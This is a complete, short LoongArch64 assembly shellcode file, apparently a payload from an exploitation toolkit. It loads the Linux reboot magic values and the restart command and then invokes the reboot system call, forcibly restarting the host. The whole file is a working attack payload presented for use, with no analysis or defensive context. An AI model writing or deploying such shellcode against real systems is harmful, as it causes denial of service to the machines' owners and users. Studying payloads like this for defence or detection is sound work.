# LoongArch64 reboot shellcode
# ---
# bcoles

.global _start
.section .text

_start:
  li.d $a0, 0xfee1dead   # magic1
  li.d $a1, 0x28121969   # magic2
  li.d $a2, 0x01234567   # LINUX_REBOOT_CMD_RESTART
  li.w $a7, 142          # reboot
  syscall 0x0101
